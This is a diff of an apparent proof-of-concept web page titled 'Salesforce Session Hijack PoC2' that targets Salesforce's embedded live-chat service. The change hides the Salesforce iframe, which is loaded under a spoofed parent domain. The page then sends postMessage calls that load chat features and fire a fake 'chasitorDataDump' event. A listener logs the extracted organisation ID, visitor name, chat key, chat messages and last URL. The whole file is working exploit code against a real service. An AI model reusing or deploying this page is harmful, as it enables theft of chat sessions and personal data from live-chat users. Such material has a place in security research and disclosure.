@@ -1,45 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce Session Hijack PoC</title>
+  <title>Salesforce Session Hijack PoC2</title>
+  <meta charset="UTF-8">
 </head>
 <body>
-  <h1>Salesforce PoC: Real Session Interaction</h1>
+  <h3>[+] Salesforce PoC: Extract Live Chat Session</h3>
   <iframe id="eswFrame"
-    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
-    style="width:100%;height:600px;"
-    onload="beginHijack()"
-    allow="camera *; microphone *;">
+          src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
+          style="width:0;height:0;border:0;display:none"
+          onload="onIframeReady()">
   </iframe>
 
   <script>
-    let targetFrame = null;
+    const iframe = document.getElementById("eswFrame");
 
-    function beginHijack() {
+    function onIframeReady() {
       console.log("[+] Iframe loaded (Salesforce 4.0)");
-      targetFrame = document.getElementById("eswFrame").contentWindow;
 
-      // Send feature loader (enable chasitor API)
-      ["chasitor", "filetransfer"].forEach(feature => {
-        console.log(`📤 Sending script.load for feature: '${feature}'`);
-        targetFrame.postMessage({ method: "script.load", feature }, "*");
-      });
+      // Load required feature scripts
+      iframe.contentWindow.postMessage({ method: "script.load", feature: "chasitor" }, "*");
+      iframe.contentWindow.postMessage({ method: "script.load", feature: "filetransfer" }, "*");
 
-      // Delay to let chasitor load
       setTimeout(() => {
-        console.log("📤 Sending fake event to trigger session info leak");
-        targetFrame.postMessage({
+        console.log("[📤] Sending fake event to trigger session info leak");
+
+        iframe.contentWindow.postMessage({
           method: "liveagent.event",
           data: {
             event: "chasitorDataDump",
             params: { key: "POC", value: "Session hijack attempt" }
           }
         }, "*");
-      }, 3000);
+      }, 2000); // Wait for scripts to load
     }
 
-    window.addEventListener("message", (event) => {
-      console.log("📩 Message from iframe:", event.data);
+    window.addEventListener("message", (e) => {
+      try {
+        const msg = JSON.parse(typeof e.data === "string" ? e.data : JSON.stringify(e.data));
+        if (msg.method === "liveagent.event") {
+          console.log("📩 LiveAgent Response:", msg);
+          const data = msg?.data?.chasitorData;
+          if (data) {
+            console.log("✅ Session Extracted:", {
+              orgId: data.orgId,
+              name: data.name,
+              chatKey: data.chatKey,
+              messages: data.chatMessages,
+              lastURL: data.lastUrl
+            });
+          }
+        }
+      } catch (e) {
+        console.warn("Failed to parse message:", e);
+      }
     });
   </script>
 </body>
